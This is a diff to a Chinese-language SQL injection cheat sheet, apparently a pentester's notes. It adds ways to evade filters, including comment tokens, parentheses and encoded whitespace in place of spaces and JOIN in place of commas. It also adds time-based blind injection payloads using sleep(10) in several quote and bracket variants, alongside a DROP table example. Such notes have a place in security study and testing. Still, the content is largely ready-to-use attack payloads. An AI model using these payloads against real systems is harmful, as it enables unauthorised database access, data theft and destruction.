@@ -8,7 +8,7 @@
 
   
 
-  ```
+  ```mysql
   DROP sampletable;--
   ```
 
@@ -67,6 +67,16 @@
 ### http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/
 
 ## 绕过
+
+### 绕过逗号限制
+
+join
+
+### 绕过空格限制
+
+1. /**/代替空格
+2. 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格
+3. 使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a
 
 ### 绕过引号限制
 
@@ -200,4 +210,14 @@ SELECT * FROM Users WHERE username = 0x61646D696E
 在得到一个字段后，使用using得到下一个字段
 select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c  
 
-*XMind: ZEN - Trial Version*
+### 基于时间的盲注
+
+' and if(1=0,1, sleep(10)) --+    
+
+" and if(1=0,1, sleep(10)) --+
+
+) and if(1=0,1, sleep(10)) --+
+
+') and if(1=0,1, sleep(10)) --+
+
+") and if(1=0,1, sleep(10)) --+
